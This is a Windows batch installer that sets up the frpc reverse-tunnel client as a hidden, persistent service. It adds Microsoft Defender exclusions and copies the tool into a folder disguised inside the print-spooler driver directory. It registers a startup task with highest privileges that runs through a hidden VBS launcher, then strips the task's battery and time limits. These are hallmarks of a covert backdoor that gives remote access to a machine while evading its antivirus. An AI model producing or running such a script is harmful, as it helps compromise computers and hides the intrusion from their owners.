@echo off
title FRP script Setup
cd /d "%~dp0"

echo Starting script...
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'"
mkdir C:\Windows\System32\spool\drivers\W32X86\frp 2>nul
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\spool\drivers\W32X86\frp'"
copy /y frpc.exe "C:\Windows\System32\spool\drivers\W32X86\frp\"
copy /y frpc.toml "C:\Windows\System32\spool\drivers\W32X86\frp\"
copy /y run_frpc.bat "C:\Windows\System32\spool\drivers\W32X86\frp\"
copy /y hide_run.vbs "C:\Windows\System32\spool\drivers\W32X86\frp\"


schtasks /create /tn "FRP Batch Hidden" /tr "wscript.exe C:\Windows\System32\spool\drivers\W32X86\frp\hide_run.vbs" /sc ONSTART /rl HIGHEST /f

echo Set fso = CreateObject("Scripting.FileSystemObject") > "%TEMP%\fix_task.vbs"
echo Set f = fso.OpenTextFile(WScript.Arguments(0), 1) >> "%TEMP%\fix_task.vbs"
echo txt = f.ReadAll >> "%TEMP%\fix_task.vbs"
echo f.Close >> "%TEMP%\fix_task.vbs"
echo txt = Replace(txt, "<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>", "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>") >> "%TEMP%\fix_task.vbs"
echo txt = Replace(txt, "<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>", "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>") >> "%TEMP%\fix_task.vbs"
echo txt = Replace(txt, "<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>", "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>") >> "%TEMP%\fix_task.vbs"
echo Set f = fso.OpenTextFile(WScript.Arguments(0), 2) >> "%TEMP%\fix_task.vbs"
echo f.Write txt >> "%TEMP%\fix_task.vbs"
echo f.Close >> "%TEMP%\fix_task.vbs"

schtasks /query /tn "FRP Batch Hidden" /xml > "%TEMP%\frp_task.xml"
cscript //nologo "%TEMP%\fix_task.vbs" "%TEMP%\frp_task.xml"
schtasks /create /tn "FRP Batch Hidden" /xml "%TEMP%\frp_task.xml" /f
del "%TEMP%\fix_task.vbs" "%TEMP%\frp_task.xml"

schtasks /run /tn "FRP Batch Hidden"

if %ERRORLEVEL% NEQ 0 (
    echo.
    echo [ERROR] FRP script exited with code %ERRORLEVEL%.
    pause
)